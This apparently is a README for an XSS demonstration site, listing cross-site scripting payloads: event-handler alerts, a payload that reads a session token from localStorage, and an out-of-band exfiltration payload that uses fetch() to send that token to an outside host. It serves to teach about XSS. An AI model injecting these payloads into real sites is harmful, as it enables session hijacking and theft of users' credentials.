# XSS Demo
*A live version of this site can be found at https://xss.jamiepegg.com*

## Example: Payloads

```html
<code id=x tabindex=1 onfocus=alert(1)></code>
```

```html
<img src=1 onerror=alert(1) />
```

```html
<p onmouseover="alert(1)">test</p>
```

```html
<p onmouseenter="alert(1)">test</p>
```

## Example: Stealing a session token from local storage

```html
<img src=1 onerror=alert(localStorage.getItem('session')) />
```

## Example: OOB exfiltration

*For demo purposes, sites such as https://webhook.site/ can be used*

```html
<img src=1 onerror=(fetch(`https://jamiepegg.com?session=${localStorage.getItem('session')}`)) />
```
